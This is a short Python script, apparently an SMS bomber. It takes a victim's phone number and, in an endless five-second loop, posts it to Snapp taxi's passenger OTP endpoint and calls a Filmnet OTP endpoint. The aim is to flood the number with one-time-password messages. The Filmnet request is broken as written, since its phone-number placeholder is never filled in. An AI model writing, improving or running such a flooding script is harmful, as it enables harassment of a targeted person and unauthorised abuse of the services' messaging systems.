import requests
from termcolor import colored
import time

url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
url1 = 'https://filmnet.ir/api-v2/access-token/users/{phonen}/otp'

phonen = input('phone number: ')

pnd = {'cellphone': f'{phonen}'}

while True:
      time.sleep(5)
      req = requests.post(url, json= pnd)
      req1 = requests.get(url1)

      print(colored('yes', 'red'))

